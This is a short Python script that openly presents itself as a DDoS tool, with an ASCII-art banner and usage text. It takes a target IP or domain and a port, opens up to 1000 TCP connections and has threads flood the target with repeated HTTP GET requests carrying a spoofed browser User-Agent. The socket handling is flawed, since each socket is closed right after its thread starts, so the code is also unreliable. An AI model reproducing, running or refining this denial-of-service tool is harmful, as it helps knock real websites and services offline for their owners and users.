import argparse
import socket
import threading
import time


logo = r"""
________  ________   ________    _____________ ________  ________  ____ 
\______ \ \______ \  \_____  \  /   _____/_   /   __   \/   __   \/_   |
 |    |  \ |    |  \  /   |   \ \_____  \ |   \____    /\____    / |   |
 |    `   \|    `   \/    |    \/        \|   |  /    /    /    /  |   |
/_______  /_______  /\_______  /_______  /|___| /____/    /____/   |___|
        \/        \/         \/        \/                               

                    Created By: Lamer Qiz"""


stop_flag = False


def parse_arguments():
    """Parses command line arguments and returns them."""
    parser = argparse.ArgumentParser(description='DDoS tool')
    parser.add_argument('-p', '--port', type=int, help='Target port number', required=True)
    parser.add_argument('-i', '--ip', type=str, help='Target IP address or domain name', required=True)
    return parser.parse_args()


def print_usage():
    """Prints information about the software."""
    global logo
    print('\n' + logo)
    print('This software is used to perform a DDoS attack.')
    print('Usage: python ddos.py -p [PORT_NUMBER] -i [TARGET_IP_ADDRESS_OR_DOMAIN]\n')


def resolve_ip(hostname):
    """Resolves a domain name to an IP address"""
    try:
        return socket.gethostbyname(hostname)
    except socket.error as e:
        print(f"Couldn't resolve hostname: {hostname}")
        exit(1)


def send_request(sock, args):
    """Sends an HTTP GET request to the given socket."""
    global stop_flag
    while not stop_flag:
        try:
            sock.send(f"GET / HTTP/1.1\r\nHost: {args.ip}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nAccept-Language: en-US,en;q=0.5\r\n\r\n".encode())
        except socket.error:
            pass


def main():
    """Main program function"""
    global logo
  
    args = parse_arguments()
   
    target_host = args.ip
  
    target_port = args.port
  
    target_ip = resolve_ip(target_host)
    
    print_usage()

    
    threads = []
    for i in range(1000):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            s.connect((target_ip, target_port))
            t = threading.Thread(target=send_request, args=(s, args))
            t.start()
            threads.append(t)

       
        print('\033c' + logo)
        time.sleep(0.1)
        logo = logo[-1] + logo[:-1]

   
    for t in threads:
        t.join()

  
    print('\nDDoS attack stopped.\n')


if __name__ == '__main__':
 
    print("Starting DDoS attack... Press Ctrl+C to stop.")

   
    main()

   
    print('Thank you for using the DDoS tool created by Lamer Qiz!')
